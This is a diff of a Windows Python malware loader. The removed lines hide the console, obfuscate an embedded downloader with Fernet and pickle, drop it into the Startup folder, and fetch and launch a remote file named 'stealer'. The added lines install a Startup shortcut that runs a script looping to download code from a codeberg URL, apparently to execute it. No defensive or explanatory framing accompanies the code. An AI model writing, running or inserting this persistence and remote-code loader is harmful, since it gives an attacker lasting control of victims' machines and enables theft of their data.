@@ -1,39 +1,26 @@
-import ctypes
-ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-import subprocess
-subprocess.run("pip install cryptography", shell= True, capture_output= True)
-subprocess.run("pip install requests", shell= True, capture_output= True)
 import os
-import requests
-import zlib
+import sys
+from win32com.client import Dispatch
 
-import pickle
-import zlib
-import time
-import base64
-from cryptography.fernet import Fernet
+def add_to_startup():
+    # Get the startup folder path using environment variables
+    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    path = os.path.join(startup_folder, "loader.lnk")
+    target = sys.executable.replace("python.exe", "pythonw.exe")
+    wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
+    script_path = os.path.join(wDir, "main.py")
+    icon = sys.executable
 
-
-
-def pack_encrypt(data):
-    key = Fernet.generate_key()
-    print("you key:"+str(key))
-    cipher = Fernet(key)
-    decrypt = pickle.dumps(cipher.decrypt)
-    compressed_data = cipher.encrypt(pickle.dumps(data))
-    return f"__import__('pickle').loads(__import__('pickle').loads({repr(decrypt)})({repr(compressed_data)}))"
-
-APPDATA = os.getenv('APPDATA')
-STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-stealer = os.path.join(os.getenv('TEMP'), "stealer.pyw")
-
-try:
-    # Encrypt and compress the content
-    encrypted_content = zlib.compress(b"""
+    # Ensure the working directory exists
+    if not os.path.exists(wDir):
+        os.makedirs(wDir)
+        print(f"Created directory: {wDir}")
+    with open(script_path, "w") as file:
+        file.write("""
 import urllib.request
 import time
 
-url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/main.py"
+url = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"
 
 while True:
     try:
@@ -44,28 +31,13 @@ while True:
         time.sleep(3)
 """)
 
-    # Python code to decrypt and execute the downloaded script
-    code = f"""
-import zlib
-import subprocess
-__import__('ctypes').windll.user32.ShowWindow(__import__('ctypes').windll.kernel32.GetConsoleWindow(), 0)
-subprocess.run("pip install cryptography", shell= True, capture_output= True)
-{pack_encrypt(exec)}({pack_encrypt(zlib.decompress)}({pack_encrypt(encrypted_content)}))
-"""
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortCut(path)
+    shortcut.Targetpath = target
+    shortcut.WorkingDirectory = wDir
+    shortcut.IconLocation = icon
+    shortcut.Arguments = f'"{script_path}"'
+    shortcut.save()
 
-    # Write the loader script to the Startup folder
-    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
-        f.write(code)
-
-except Exception as e:
-    print(f"An error occurred: {e}")
-
-payload = code
-
-open(stealer, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/stealer.txt').content)
-subprocess.Popen(["python", stealer], start_new_session=True)
-
-while True:
-    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
-        f.write(payload)
-    time.sleep(3)
+add_to_startup()
+print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
